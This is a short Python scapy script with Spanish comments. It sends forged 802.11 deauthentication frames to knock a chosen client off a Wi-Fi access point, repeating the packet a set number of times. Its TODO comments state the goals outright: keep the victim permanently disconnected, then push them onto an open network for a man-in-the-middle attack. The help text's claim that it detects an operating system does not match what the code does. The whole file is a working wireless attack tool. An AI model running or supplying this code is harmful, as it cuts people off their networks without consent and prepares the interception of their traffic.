
#!/usr/bin/python2.7

from scapy.all import *

import logging
import argparse
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

parser = argparse.ArgumentParser(description="Script para detectar el OS de un sistema")
parser.add_argument('-V', '--MACV',metavar="MUSER", help="MAC de usuario a desautenticar", dest='USER')
parser.add_argument('-G', '--MACG', metavar="MACPOINT",help="MAC del acces point", required=True,dest='POINT')
parser.add_argument('-I', '--Interface', metavar="IRED",help="La interfaz de red", required=True, dest='RED')
parser.add_argument('-n', '--Iterations', metavar="N",help="Numero de paquetes Death", dest='N')

args = parser.parse_args()

request = RadioTap()/Dot11(addr1=args.USER,addr2=args.POINT,addr3=args.POINT)/Dot11Deauth(reason=7)

#FAlTA:hacer ciclo endefinido pra mantener  victima desautenticada permanentemente

response = sendp(request, iface=args.RED, loop=args.N)

print 'Desautenticando  ' + args.USER + 'Conectado a ' + args.POINT + ' por la interfaz ' + args.RED


#FALTA:Autenticar a victima  en red  abierta, para hacer MITM
